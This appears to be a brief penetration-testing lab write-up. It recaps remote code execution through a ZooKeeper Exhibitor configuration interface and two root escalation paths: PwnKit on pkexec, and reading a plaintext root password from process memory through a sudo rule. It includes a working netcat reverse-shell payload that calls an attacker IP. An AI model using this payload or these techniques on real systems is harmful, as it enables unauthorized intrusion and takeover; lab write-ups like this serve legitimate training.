#### Recap
Service discovery identified the Exhibitor interface for ZooKeeper. The exposed configuration functionality was vulnerable to remote code execution.
```bash
$(/bin/nc -e /bin/sh 192.168.45.216 4444 &)
```
The application exposure yielded an initial shell.

Local privilege escalation
Path one: the SUID pkexec binary was affected by PwnKit, which led to root access.
Path two: a sudo rule allowed process memory collection. A password-store process contained the root credential in plaintext, leading to root access.
